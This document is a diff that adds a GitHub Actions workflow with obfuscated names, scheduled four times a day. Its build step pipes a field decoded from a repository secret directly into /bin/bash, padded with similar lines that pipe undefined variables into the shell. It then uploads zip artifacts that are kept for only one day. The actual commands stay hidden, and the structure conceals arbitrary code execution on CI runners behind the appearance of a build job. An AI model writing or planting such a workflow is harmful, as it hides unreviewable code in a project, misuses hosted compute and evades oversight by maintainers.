@@ -1,0 +1,30 @@
+name: observereleanorst
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 5,11,17,23 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: observereleanorst
+        env:
+          uc5: ${{ secrets.uc5 }}
+        run: |
+          printf '%s' "$uc5" | jq -r .lylwj035 | /bin/bash
+          echo $kvbd20920 | jq -r .oi31 | /bin/bash
+          printf '%s' "$qoo2" | jq -r .w15 | /bin/bash
+          echo $cin249 | jq -r .hozz92 | /bin/bash
+          echo $cxyky05286 | jq -r .oiee27933 | /bin/bash
+          echo $rb6 | jq -r .c4 | /bin/bash
+          echo $n970 | jq -r .ezb703 | /bin/bash
+          printf '%s' "$lxk7" | jq -r .lulnr6465 | /bin/bash
+          echo $pa2 | jq -r .tigsr350 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: RIiZT0cz
+          path: "*.zip"
+          retention-days: 1
